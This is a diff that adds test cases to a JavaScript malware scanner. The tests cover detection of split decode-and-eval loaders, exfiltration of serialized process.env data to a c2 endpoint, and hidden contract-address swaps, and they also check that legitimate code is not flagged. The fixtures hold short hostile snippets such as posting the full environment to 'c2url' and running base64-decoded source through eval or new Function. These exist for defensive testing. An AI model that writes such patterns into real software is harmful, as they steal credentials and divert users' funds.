@@ -271,3 +271,142 @@ test("normal Supabase/Express server is not flagged", () => {
 	assert.equal(r.level, LEVEL.NONE);
 	assert.deepEqual(r.findings, []);
 });
+
+// ── Harder gaps (round 2, 2026-11-13) ────────────────────────────────────────────────────────
+
+// ── Multi-line decode+exec (decode_exec_split) ───────────────────────────────────────────────
+// The existing decode_exec rule requires both halves on the same line.
+// Split across lines is MEDIUM — weaker certainty but still worth flagging.
+
+test("atob on one line + eval on another is flagged as decode_exec_split (MEDIUM)", () => {
+	const r = scan("lib/loader.js",
+		"const decoded = atob(payload);\n" +
+		"// do some stuff\n" +
+		"eval(decoded);");
+	assert.ok(rules(r).includes("decode_exec_split"), "split atob + eval should trigger decode_exec_split");
+	// MEDIUM not HIGH — same-line is HIGH; split is advisory
+	const f = r.findings.find((x) => x.rule === "decode_exec_split");
+	assert.equal(f.severity, "medium");
+});
+
+test("Buffer.from(...,'base64').toString() on one line + new Function on another is flagged", () => {
+	const r = scan("routes/auth.js",
+		"const src = Buffer.from(encoded, 'base64').toString();\n" +
+		"const handler = new Function('require', src);\n" +
+		"handler(require);");
+	assert.ok(rules(r).includes("decode_exec_split"));
+});
+
+test("String.fromCharCode spread across lines + eval is flagged", () => {
+	const r = scan("x.js",
+		"const s = String.fromCharCode(104, 101, 108, 108, 111);\n" +
+		"eval(s);");
+	assert.ok(rules(r).includes("decode_exec_split"));
+});
+
+// same-line still fires decode_exec HIGH (not the split version)
+test("same-line atob+eval still fires decode_exec HIGH, not the split version", () => {
+	const r = scan("x.js", "eval(atob(payload));");
+	assert.ok(rules(r).includes("decode_exec"), "same-line must still fire decode_exec");
+	assert.ok(!rules(r).includes("decode_exec_split"), "same-line must not also fire the split rule");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+// False-positive regressions for decode_exec_split
+test("Buffer.from without 'base64' argument + eval is NOT flagged (image/binary data)", () => {
+	// A utility that converts an image buffer to binary alongside a template engine using eval
+	const r = scan("img-utils.js",
+		"const binary = Buffer.from(imageData).toString('binary');\n" +
+		"const rendered = eval(templateExpr);");
+	assert.ok(!rules(r).includes("decode_exec_split"), "Buffer.from without base64 keyword must not trigger split rule");
+});
+
+test("btoa (encoding, not decoding) alongside eval is NOT flagged", () => {
+	// btoa encodes — the DECODE_EXPR only matches atob (decode direction)
+	const r = scan("auth.js",
+		"const token = btoa(username + ':' + password);\n" +
+		"const result = eval(safeExpression);");
+	assert.ok(!rules(r).includes("decode_exec_split"), "btoa (encoding) must not trigger the decode half");
+});
+
+test("normal crypto usage alongside eval template engine is NOT flagged", () => {
+	// Legitimate: a build script that uses base64 for asset encoding and eval for config templates
+	const r = scan("build.js",
+		"// encode asset to base64 for embedding\n" +
+		"const asset = Buffer.from(fs.readFileSync('./logo.png')).toString('base64');\n" +
+		"const config = eval('(' + configJson + ')');");
+	// Buffer.from without 'base64' as decode input — should not fire
+	assert.ok(!rules(r).includes("decode_exec_split"));
+});
+
+// ── Broader process.env serialization variants ───────────────────────────────────────────────
+
+test("spreading process.env into a JSON body is high (BeaverTail variant)", () => {
+	const r = scan("routes/auth.js",
+		"const body = JSON.stringify({ sysInfo: hostname, processInfo: { ...process.env } });\n" +
+		"fetch(c2url, { method: 'POST', body });");
+	assert.ok(rules(r).includes("process_env_exfil"), "spread process.env in JSON.stringify must be caught");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("qs.stringify(process.env) sent over network is high", () => {
+	const r = scan("lib/beacon.js",
+		"const payload = qs.stringify(process.env);\n" +
+		"axios.post(c2, { data: payload });");
+	assert.ok(rules(r).includes("process_env_exfil"), "qs.stringify(process.env) must be caught");
+});
+
+test("btoa(JSON.stringify(process.env)) is high (encoded exfil)", () => {
+	const r = scan("lib/init.js",
+		"const encoded = btoa(JSON.stringify(process.env));\n" +
+		"fetch(url, { method: 'POST', body: encoded });");
+	assert.ok(rules(r).includes("process_env_exfil"), "base64-encoded env exfil must be caught");
+});
+
+// Regression: legitimate uses of process.env alongside network calls must stay clean
+test("createClient(process.env.URL, process.env.KEY) alongside fetch is NOT flagged", () => {
+	const r = scan("lib/db.js",
+		"const client = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);\n" +
+		"const res = await fetch(`${process.env.API_URL}/data`);");
+	assert.ok(!rules(r).includes("process_env_exfil"), "per-key env access must not trigger process_env_exfil");
+});
+
+// ── Contract-address swap (addr_concat_swap) ─────────────────────────────────────────────────
+
+test("hidden state flag+value swapping contract address via '0x'+var inside if(&&) is flagged", () => {
+	// Direct replica of the Sample 3 pattern: multi-condition if, "0x" + hidden var
+	const r = scan("src/pages/Home.js",
+		"const [data] = useState({ flag: false, value: 321651351, id: '48a2cae82fcd84e64fc802d2aeeb180fe1fbca70' });\n" +
+		"if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag) setRouter('0x' + data.id);");
+	assert.ok(rules(r).includes("addr_concat_swap"), "Sample 3 contract-address swap must be caught");
+});
+
+test("numeric threshold + flag controlling router address swap is flagged", () => {
+	const r = scan("Staking.jsx",
+		"if (inputAmount > threshold && flagEnabled) setContract('0x' + hiddenAddr);");
+	assert.ok(rules(r).includes("addr_concat_swap"));
+});
+
+// False-positive regressions for addr_concat_swap
+test("single-condition address formatter is NOT flagged", () => {
+	// Legitimate: normalise an address that may be missing the 0x prefix
+	const r = scan("utils.js", "if (!addr.startsWith('0x')) addr = '0x' + addr.toLowerCase();");
+	assert.deepEqual(rules(r), [], "single-condition 0x prefix formatter must not be flagged");
+});
+
+test("full hardcoded contract address in React state is NOT flagged", () => {
+	const r = scan("App.jsx",
+		"const TOKEN = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';\n" +
+		"const [router, setRouter] = useState(TOKEN);");
+	assert.deepEqual(rules(r), [], "full constant address must not be flagged");
+});
+
+test("normal DeFi app with address constants and conditional logic is NOT flagged", () => {
+	// A real Uniswap-style swap: pick between two full address constants based on network
+	const r = scan("hooks/useSwap.ts",
+		"const routerAddr = chainId === 1\n" +
+		"  ? '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'\n" +
+		"  : '0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3';\n" +
+		"setRouter(routerAddr);");
+	assert.deepEqual(rules(r), [], "ternary with full address constants must not be flagged");
+});
